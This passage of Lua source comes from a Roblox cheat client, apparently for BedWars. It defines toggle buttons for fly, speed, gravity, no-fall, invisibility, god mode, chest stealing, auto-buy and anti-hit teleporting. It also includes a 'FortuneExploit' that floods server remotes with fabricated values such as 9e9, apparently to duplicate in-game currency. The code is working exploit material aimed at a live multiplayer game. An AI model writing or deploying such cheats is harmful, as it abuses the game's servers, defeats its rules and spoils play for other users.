							local Magnitude = (v.Position - PrimaryPart.Position).Magnitude
							if Magnitude <= 30 then
								for _, item in pairs(v.ChestFolderValue.Value:GetChildren()) do
									if item:IsA("Accessory") then
										task.wait()
										game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):FindFirstChild("@rbxts").net.out._NetManaged:FindFirstChild("Inventory/ChestGetItem"):InvokeServer(v.ChestFolderValue.Value, item)
									end
								end
							end
						end
					end)
				until (not Stealer.Enabled)
				CreateNotification("ChestStealer", 1.2, "ChestStealer has been disabled")
			end)
		end
	end,
})

local function getfireball()
	local bows = {}
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:find("fireball") then
			table.insert(bows,v)
		end
	end
	return bows
end

local ballSpeed = false
local fireball = true
FireballSpeed = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "FireballSpeed",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("FireballSpeed", 1.2, "FireballSpeed has been enabled")
            task.spawn(function()
                repeat task.wait()
                    local target = game.Players.LocalPlayer  -- Reference to the player's own character
                    if target and target.Character and target.Character.PrimaryPart then
                        local bows = getfireball()
                        for i, v in pairs(bows) do
                            spoofHand(v.Name)
                            task.wait(0.1)
                            if v.Name == "fireball" then
                                if not fireball then continue end
                            end
                            shoot(v, target.Character.PrimaryPart.Position)
                            task.wait(0.52)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 33
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 32
							task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 31
                            task.wait(0.1)

                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
                        end
                    end
                until (not ballSpeed)
                CreateNotification("FireballSpeed", 1.2, "FireballSpeed has been disabled")
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
            end)
        else

        end
    end,
})

Gravity = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "Gravity",
    ["Function"] = function(callback)
        if callback then
			CreateNotification("Gravity", 1.2, "Gravity has been enabled")
			task.spawn(function()
				repeat task.wait()	
				workspace.Gravity = 72.6
		until (not Gravity.Enabled)
		workspace.Gravity = 196.2
            CreateNotification("Gravity", 1.2, "Gravity has been disabled")
        end)
    end
end
})

HighJump = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "HighJump",
    ["Function"] = function(callback)
        if callback then
            local HighJumpenabled = true

            while HighJumpenabled do
                CreateNotification("HighJump", 1.2, "HighJump has been enabled")
                
                sendPlayerUp()

                HighJumpenabled = Speed.Enabled
                CreateNotification("HighJump", 1.2, "HighJump has been disabled")
            end
        end
    end
})


local function getgrapple()
	local bows = {}
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:find("grappling_hook") then
			table.insert(bows,v)
		end
	end
	return bows
end

local countdownValue = 2.5
local countdownLabel = nil

local function createUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "FlightModeUI"
    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local Frame_1 = Instance.new("Frame")
    Frame_1.Parent = ScreenGui
    Frame_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Frame_1.BackgroundTransparency = 0.8
    Frame_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_1.BorderSizePixel = 0
    Frame_1.Position = UDim2.new(0.5, -116.5, 0.5, -51.5)
    Frame_1.Size = UDim2.new(0, 233, 0, 103)
    
    local UICorner_1 = Instance.new("UICorner")
    UICorner_1.Parent = Frame_1
    UICorner_1.CornerRadius = UDim.new(0, 20)
    
    countdownLabel = Instance.new("TextLabel")
    countdownLabel.Name = "CountdownLabel"
    countdownLabel.Parent = Frame_1
    countdownLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    countdownLabel.BackgroundTransparency = 1
    countdownLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    countdownLabel.BorderSizePixel = 0
    countdownLabel.Position = UDim2.new(0.5, -100, 0.5, -25)
    countdownLabel.Size = UDim2.new(0, 200, 0, 50)
    countdownLabel.Font = Enum.Font.LuckiestGuy
    countdownLabel.Text = string.format("%.1f", countdownValue)
    countdownLabel.TextScaled = true
    countdownLabel.TextSize = 14
    countdownLabel.TextWrapped = true
    
    local Frame_2 = Instance.new("Frame")
    Frame_2.Parent = ScreenGui
    Frame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame_2.BorderSizePixel = 0
    Frame_2.Position = UDim2.new(0.5, -77, 0.5, 20)
    Frame_2.Size = UDim2.new(0, 154, 0, 22)
    
    local UICorner_2 = Instance.new("UICorner")
    UICorner_2.Parent = Frame_2
    UICorner_2.CornerRadius = UDim.new(0, 30)
end

-- 删除UI的函数
local function removeUI()
    local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
    if playerGui then
        local flightModeUI = playerGui:FindFirstChild("FlightModeUI")
        if flightModeUI then
            flightModeUI:Destroy()
        end
    end
    countdownLabel = nil
end

-- 更新倒计时的函数
local function updateCountdownUI(value)
    if countdownLabel then
        countdownLabel.Text = string.format("%.1f", value)
    end
end

local Flying = true

local function countdown()
    while Flying and countdownValue > 0 do
        countdownValue = countdownValue - 0.1
        updateCountdownUI(countdownValue)
        wait(0.1)
    end
end

Flight = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "Fly",
    ["Function"] = function(callback)
        if callback then
            local mode = FlightMode.Value
            Flying = true
            createUI() 
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23.5

            task.spawn(function()
                countdown()
            end)

            task.spawn(function()
				CreateNotification("Fly", 1.2, "Fly has been enabled")
                repeat
                    task.wait()
                    local velo = entity.HumanoidRootPart().Velocity
                    if mode == "Velocity" then
                        local velo = entity.HumanoidRootPart().Velocity
                        entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 2.2, velo.Z)
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 70, velo.Z)
                        end
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, -70, velo.Z)
                        end
                    elseif mode == "CFrame" then
                        entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 2.2, velo.Z)
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                            entity.HumanoidRootPart().CFrame += Vector3.new(0, 7, 0)
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, 10, velo.Z)
                        end
                        if game.UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                            entity.HumanoidRootPart().CFrame += Vector3.new(0, -7, 0)
                            entity.HumanoidRootPart().Velocity = Vector3.new(velo.X, -10, velo.Z)
                        end
                    elseif mode == "Heatseeker" then
                        -- Heatseeker模式的代码
                    end
                until not Flying

                Flying = false
                countdownValue = 2.5
                removeUI()
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23
            end)
        else
            Flying = false
            countdownValue = 2.5
            removeUI()
			CreateNotification("Fly", 1.2, "Fly has been disabled")
        end
    end,
})



FlightMode = Flight.CreatePicker({
	["Name"] = "Mode",
	["Function"] = function()

	end,
	["Options"] = {"Velocity","CFrame","Heatseeker"}
})


local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local PrimaryPart = Character:WaitForChild("HumanoidRootPart")
local CurrentCamera = workspace.CurrentCamera
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local infFlyPart
local InfiniteFlyConnection

local function onCharacterAdded(newCharacter)
    Character = newCharacter
    PrimaryPart = Character:WaitForChild("HumanoidRootPart")
end

Player.CharacterAdded:Connect(onCharacterAdded)

local function onCharacterRemoving()
    if InfiniteFlyConnection then
        InfiniteFlyConnection:Disconnect()
    end
    if infFlyPart then
        infFlyPart:Destroy()
    end
    CurrentCamera.CameraSubject = Player.Character
end

Player.CharacterRemoving:Connect(onCharacterRemoving)

InfiniteFly = GuiLibrary.API.Windows.Blatant.CreateButton({
    Name = "InfiniteFly",
    Function = function(callback)
        if callback then
            CreateNotification2("InfiniteFly", 2.2, "Teleport UP")
            CreateNotification("InfiniteFly", 1.2, "InfiniteFly has been disabled")
            infFlyPart = Instance.new("Part", workspace)
            infFlyPart.Anchored = true
            infFlyPart.CanCollide = true
            infFlyPart.CFrame = PrimaryPart.CFrame
            infFlyPart.Size = Vector3.new(0.5, 0.5, 0.5)
            infFlyPart.Transparency = RootPartShow.Enabled and 0 or 1
            PrimaryPart.CFrame += Vector3.new(0, 1000000, 0)
            CurrentCamera.CameraSubject = infFlyPart
            InfiniteFlyConnection = RunService.Heartbeat:Connect(function()
                if PrimaryPart.Position.Y < infFlyPart.Position.Y then
                    PrimaryPart.CFrame += Vector3.new(0, 1000000, 0)
                end

                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                    infFlyPart.CFrame += Vector3.new(0, 0.45, 0)
                end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                    infFlyPart.CFrame += Vector3.new(0, -0.45, 0)
                end

                infFlyPart.CFrame = CFrame.new(PrimaryPart.CFrame.X, infFlyPart.CFrame.Y, PrimaryPart.CFrame.Z)
            end)
        else
            pcall(function()
                InfiniteFlyConnection:Disconnect()
                for i = 1, 15 do
                    task.wait(0.01)
                    PrimaryPart.Velocity = Vector3.new(0, 0, 0)
                    PrimaryPart.CFrame = infFlyPart.CFrame
                end
                infFlyPart:Destroy()
                CreateNotification("InfiniteFly", 1.2, "InfiniteFly has been disabled")
            end)
            CurrentCamera.CameraSubject = Character
        end
    end,
})

RootPartShow = InfiniteFly.CreateToggle({
    Name = "ShowRoot",
    Function = function() end
})

local GroundHit = getRemote("GroundHit")
NoFall = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "NoFall",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("NoFall", 1.2, "NoFall has been enabled")
				repeat task.wait(0.2)
					GroundHit:FireServer()
				until (not NoFall.Enabled)
				CreateNotification("NoFall", 1.2, "NoFall has been disabled")
			end)
		end
	end,
})

local cloneref = cloneref or function(data: userdata) return data end;
local enchanttoggled  = false;
local getservice = function(service: string)
    return cloneref(game:FindService(service));
end;

local getrandomvalue = function(tab: table)
    return #tab > 0 and tab[math.random(1, #tab)] or ''
end;

local replicatedstorage = getservice('ReplicatedStorage');
local lplr = getservice('Players').LocalPlayer;
local inputservice = getservice('UserInputService');
local remote = replicatedstorage:WaitForChild('rbxts_include'):WaitForChild('node_modules'):WaitForChild('@rbxts'):WaitForChild('net'):WaitForChild('out'):WaitForChild('_NetManaged'):WaitForChild('RequestFortuneDoubleDown');
local effects = {
    'fire_3', 'forest_3', 'cloud_3', 'void_3', 'static_3', 'updraft_2', 
    'shield_gen_3', 'anti_knockback_2', 'rapid_regen_3', 'execute_3', 
    'wind_3', 'plunder_2', 'critical_strike_3', 'volley_3', 
    'grounded_3', 'clingy_3', 'life_steal_3', 'fortune_1'
}

if renderexploit then 
    pcall(task.cancel, renderexploit)
end;

renderexploit = task.spawn(function()
    repeat 
        task.wait()
        if not enchanttoggled then 
            continue
        end;
        for i,v in effects do 
            remote:FireServer({statusEffectType = v})
        end
        task.wait(0.8)
    until false;
end);


DupeExploit = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "FortuneExploit",
    ["Function"] = function(callback)
        if callback then
            DupeExploit.Enabled = true
            enchanttoggled = callback
            task.spawn(function()
                repeat
                    task.wait(0.1)
                    
                    local cloneref = cloneref or function(data)
                        return data
                    end
                    
                    local getservice = function(service)
                        return cloneref(game:FindService(service))
                    end
                    
                    local getrandomvalue = function(tab)
                        return #tab > 0 and tab[math.random(1, #tab)] or ''
                    end
                    
                    local remote = getservice('ReplicatedStorage'):WaitForChild('rbxts_include'):WaitForChild('node_modules'):WaitForChild('@rbxts'):WaitForChild('net'):WaitForChild('out'):WaitForChild('_NetManaged'):WaitForChild('RequestFortuneCashOut')
                    remote:FireServer({
                        statusEffectType = 'fortune_1',
                        fortuneStacks = getrandomvalue({999999, 9e9})
                    })
                until not DupeExploit.Enabled
            end)
        else
        end
    end,
})


GodMode = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "MelodyGodMode",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("MelodyGodMode", 1.2, "MelodyGodMode has been enabled")
				repeat task.wait(0.2)
					local args = {
                        [1] = {
                            ["healTarget"] = game.Players.LocalPlayer
                        }
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("PlayGuitar"):FireServer(unpack(args))
				until (not GodMode.Enabled)
				CreateNotification("MelodyGodMode", 1.2, "MelodyGodMode has been disabled")
			end)
		end
	end,
})

jellyfishExploit = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "jellyfishExploit",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("jellyfishExploit", 1.2, "jellyfishExploit has been enabled")
				repeat task.wait(0.2)
					local args = {
                        [1] = "electrify_jellyfish"
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("useAbility"):FireServer(unpack(args))
				until (not jellyfishExploit.Enabled)
				CreateNotification("jellyfishExploit", 1.2, "jellyfishExploit has been disabled")
			end)
		end
	end,
})

local function Invisfunc()
    if IsAlive(LocalPlayer) then
        LocalPlayer.Character.LowerTorso.CollisionGroup = "Participants"
        LocalPlayer.Character.UpperTorso.CollisionGroup = "Participants"
        local Animation = Instance.new("Animation")
        Animation.AnimationId = "rbxassetid://11360825341"
        local PlayerAnimation = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Animation)
        if PlayerAnimation then
            LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
            LocalPlayer.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)

            PlayerAnimation.Priority = Enum.AnimationPriority.Action4
            PlayerAnimation.Looped = true
            PlayerAnimation:Play()
            PlayerAnimation:AdjustSpeed(0 / 10)
        end
    end
end


InvisibleExploit = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "InvisibleExploit",
    ["Function"] = function(callback)
        if callback then
            task.spawn(function()
                repeat task.wait(0.2)
            Invisfunc()
            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Transparency = 0.5

                until (not InvisibleExploit.Enabled)
                game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Transparency = 1

            end)
        end
    end,
})


DragonBreathExploit = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "DragonBreathExploit",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("Dragon Breath", 1.2, "Dragon Breath has been enabled")
				repeat task.wait(0.2)
                game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.DragonBreath:FireServer({
							["Player"] = game:GetService("Players").LocalPlayer
				})
				until (not DragonBreathExploit.Enabled)
				CreateNotification("Dragon Breath", 1.2, "Dragon Breath has been disabled")
			end)
		end
	end,
})

Speed = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "Speed",
    ["Function"] = function(callback)
        if callback then
			task.spawn(function()
				CreateNotification("Speed", 1.2, "Speed has been enabled")
				repeat task.wait(0.2)

                
                local mode = SpeedMode.Value

                if mode == "Normal" then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23
                elseif mode == "Light Step" then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 26
                end

			until (not Speed.Enabled)
			CreateNotification("Speed", 1.2, "Speed has been disabled")
            end)
        end
	end,
})
SpeedMode = Speed.CreatePicker({
    ["Name"] = "Mode",
    ["Function"] = function()

    end,
    ["Options"] = {"Normal","Light Step"}
})

FOV = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "FOV",
	["Function"] = function(callback)
		if callback then
			CreateNotification("FOV", 1.2, "FOV has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
                game.Workspace.CurrentCamera.FieldOfView = 135
				until (not FOV.Enabled)
				CreateNotification("FOV", 1.2, "FOV has been disabled")
			end)
		end
	end,
})

local function placeBlock(pos,block)
	local blockenginemanaged = game.ReplicatedStorage.rbxts_include.node_modules:WaitForChild("@easy-games"):WaitForChild("block-engine").node_modules:WaitForChild("@rbxts").net.out:WaitForChild("_NetManaged")
	local args = { [1] = { ['blockType'] = block, ['position'] = Vector3.new(pos.X / 3,pos.Y / 3,pos.Z / 3), ['blockData'] = 0 } }
	blockenginemanaged.PlaceBlock:InvokeServer(unpack(args))
end

local function getWool()
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:lower():find("wool") then
			return v.Name
		end
	end
end

local scaffoldRun
Scaffold = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "Scaffold",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("Scaffold", 1.2, "Scaffold has been enabled")
				scaffoldRun = game["Run Service"].RenderStepped:Connect(function()
					if game.UserInputService:IsKeyDown(Enum.KeyCode.Space) then
						local velo = lplr.Character.PrimaryPart.Velocity
						lplr.Character.PrimaryPart.Velocity = Vector3.new(velo.X,10,velo.Z)
					end
					local block = getWool()
					placeBlock((lplr.Character.PrimaryPart.CFrame + lplr.Character.PrimaryPart.CFrame.LookVector * 1) - Vector3.new(0,4.5,0),block)
					if not Scaffold.Enabled then return end
					placeBlock((lplr.Character.PrimaryPart.CFrame + lplr.Character.PrimaryPart.CFrame.LookVector * 2) - Vector3.new(0,4.5,0),block)
					if not Scaffold.Enabled then return end
					placeBlock((lplr.Character.PrimaryPart.CFrame + lplr.Character.PrimaryPart.CFrame.LookVector * 3) - Vector3.new(0,4.5,0),block)
				end)
			end)
		else
			pcall(function()
				scaffoldRun:Disconnect()
			end)
			CreateNotification("Scaffold", 1.2, "Scaffold has been disabled")
		end
	end,
})

InfiniteJump = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "InfiniteJump",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("InfiniteJump", 1.2, "InfiniteJump has been enabled")
            local InfiniteJumpEnabled = true
            
            local function onJumpRequest()
                if InfiniteJumpEnabled then
                    local humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid:ChangeState("Jumping")
                    end
                end
            end

            game:GetService("UserInputService").JumpRequest:Connect(onJumpRequest)
        else
            InfiniteJumpEnabled = false
            CreateNotification("InfiniteJump", 1.2, "InfiniteJump has been disabled")
        end
    end,
})


local ConsumeRemote = getRemote("ConsumeItem")
AutoConsume = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "AutoConsume",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AutoConsume", 1.2, "AutoConsume has been enabled")
			task.spawn(function()
				repeat task.wait()
					if hasItem("speed_potion") then
						ConsumeRemote:InvokeServer({
							["item"] = inventory:WaitForChild("speed_potion")
						})
					end
					if hasItem("pie") then
						ConsumeRemote:InvokeServer({
							["item"] = inventory:WaitForChild("pie")
						})
					end
				until (not AutoConsume.Enabled)
				CreateNotification("AutoConsume", 1.2, "AutoConsume has been disabled")
			end)
		end
	end,
})

AutoHeal = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "AutoHeal",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("AutoHeal", 1.2, "AutoHeal has been enabled")
            task.spawn(function()
                repeat
                    task.wait()
                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health < 75 then
                        if hasItem("apple") then
                            ConsumeRemote:InvokeServer({
                                ["item"] = inventory:WaitForChild("apple")
                            })
                        end
                    end
                until not AutoHeal.Enabled
                CreateNotification("AutoHeal", 1.2, "AutoHeal has been disabled")
            end)
        end
    end,
})

AutoUpgradeEra = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "AutoUpgradeEra",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AutoUpgradeEra", 1.2, "AutoUpgradeEra has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
                    local args = {
                        [1] = {
                            ["era"] = "iron_era"
                        }
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("RequestPurchaseEra"):InvokeServer(unpack(args))

                    local args = {
                        [1] = {
                            ["era"] = "diamond_era"
                        }
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("RequestPurchaseEra"):InvokeServer(unpack(args))

                    local args = {
                        [1] = {
                            ["era"] = "emerald_era"
                        }
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("RequestPurchaseEra"):InvokeServer(unpack(args))
				until (not AutoUpgradeEra.Enabled)
				CreateNotification("AutoUpgradeEra", 1.2, "AutoUpgradeEra has been disabled")
			end)
		end
	end,
})

local function Buystonesword()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["ignoredByKit"] = {
                    [1] = "barbarian",
                    [2] = "dasher",
                    [3] = "frost_hammer_kit",
                    [4] = "tinker"
                },
                ["itemType"] = "stone_sword",
                ["price"] = 70,
                ["superiorItems"] = {
                    [1] = "iron_sword",
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["lockAfterPurchase"] = true,
                ["category"] = "Combat",
                ["disabledInQueue"] = {
                    [1] = "tnt_wars"
                }
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function Buyironsword()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["ignoredByKit"] = {
                    [1] = "barbarian",
                    [2] = "dasher",
                    [3] = "frost_hammer_kit",
                    [4] = "tinker"
                },
                ["itemType"] = "iron_sword",
                ["price"] = 70,
                ["superiorItems"] = {
                    [1] = "diamond_sword",
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["lockAfterPurchase"] = true,
                ["category"] = "Combat",
                ["disabledInQueue"] = {
                    [1] = "tnt_wars"
                }
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyDiamondsword()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["ignoredByKit"] = {
                    [1] = "barbarian",
                    [2] = "dasher",
                    [3] = "frost_hammer_kit",
                    [4] = "tinker"
                },
                ["itemType"] = "diamond_sword",
                ["price"] = 70,
                ["superiorItems"] = {
                    [1] = "emerald_sword",
                },
                ["currency"] = "emerald",
                ["amount"] = 1,
                ["lockAfterPurchase"] = true,
                ["category"] = "Combat",
                ["disabledInQueue"] = {
                    [1] = "tnt_wars"
                }
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyleatherArmor()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["lockAfterPurchase"] = true,
                ["itemType"] = "leather_chestplate",
                ["price"] = 50,
                ["customDisplayName"] = "Leather Armor",
                ["superiorItems"] = {
                    [1] = "iron_chestplate"
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["category"] = "Combat",
                ["ignoredByKit"] = {
                    [1] = "bigman",
                    [2] = "tinker"
                },
                ["spawnWithItems"] = {
                    [1] = "leather_helmet",
                    [2] = "leather_chestplate",
                    [3] = "leather_boots"
                },
                ["nextTier"] = "iron_chestplate"
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyIronArmor()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["lockAfterPurchase"] = true,
                ["itemType"] = "iron_chestplate",
                ["price"] = 120,
                ["prevTier"] = "leather_chestplate",
                ["customDisplayName"] = "Iron Armor",
                ["currency"] = "iron",
                ["ignoredByKit"] = {
                    [1] = "bigman",
                    [2] = "tinker"
                },
                ["category"] = "Combat",
                ["tiered"] = true,
                ["nextTier"] = "diamond_chestplate",
                ["spawnWithItems"] = {
                    [1] = "iron_helmet",
                    [2] = "iron_chestplate",
                    [3] = "iron_boots"
                },
                ["amount"] = 1
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

local function BuyDiamondArmor()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["lockAfterPurchase"] = true,
                ["itemType"] = "Diamond_chestplate",
                ["price"] = 8,
                ["customDisplayName"] = "Diamond Armor",
                ["superiorItems"] = {
                    [1] = "iron_chestplate"
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["category"] = "Combat",
                ["ignoredByKit"] = {
                    [1] = "bigman",
                    [2] = "tinker"
                },
                ["spawnWithItems"] = {
                    [1] = "diamond_helmet",
                    [2] = "diamond_chestplate",
                    [3] = "diamond_boots"
                },
                ["nextTier"] = "diamond_chestplate"
            },
            ["shopId"] = "1_item_shop"
        }
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("BedwarsPurchaseItem"):InvokeServer(unpack(args))
end

AutoBuy = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "AutoBuy",
	["Function"] = function(callback)
		if callback then
			CreateNotification("AutoBuy", 1.2, "AutoBuy has been enabled")
			task.spawn(function()
				repeat task.wait(0.2)
					if hasItem("wood_sword") then
						Buystonesword()
					end
                    if hasItem("stone_sword") and not hasItem("iron_chestplate") and not hasItem("diamond_chestplate") and not hasItem("emerald_chestplate") then
                        BuyleatherArmor()
                    end
                    if hasItem("leather_chestplate") then
				        BuyIronArmor()
			        end
                    if hasItem("iron_sword") or hasItem("stone_sword") or hasItem("wood_sword") then
				        BuyDiamondsword()
			        end
                    if hasItem("iron_chestplate") then
				        BuyDiamondArmor()
			        end

				until (not AutoBuy.Enabled)
				CreateNotification("AutoBuy", 1.2, "AutoBuy has been disabled")
			end)
		end
	end,
})

AntiDeath = GuiLibrary.API.Windows.Utility.CreateButton({
    ["Name"] = "AntiDeath",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("AntiDeath", 1.2, "AntiDeath has been enabled")
			task.spawn(function()
			repeat task.wait()

                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:FindFirstChildOfClass("Humanoid")

                    if humanoid and humanoid.Health < 21 then
						sendPlayerUp()
						wait(3.5)
					end
				until (not AntiDeath.Enabled)
                CreateNotification("AntiDeath", 1.2, "AntiDeath has been disabled")
			end)
        end
    end,
})




Antihit = GuiLibrary.API.Windows.Utility.CreateButton({
	["Name"] = "Antihit",
	["Function"] = function(callback)
		if callback then
			local lastHealth = lplr.Character.Humanoid.Health
			task.spawn(function()
				repeat task.wait()
					if lplr.Character.Humanoid.Health < lastHealth then
						if getNearestPlayer(16) then
							lplr.Character.PrimaryPart.CFrame = (getNearestPlayer(16).Character.PrimaryPart.CFrame + getNearestPlayer(16).Character.PrimaryPart.CFrame.LookVector * -4) + Vector3.new(0,9,0)
						end
					end
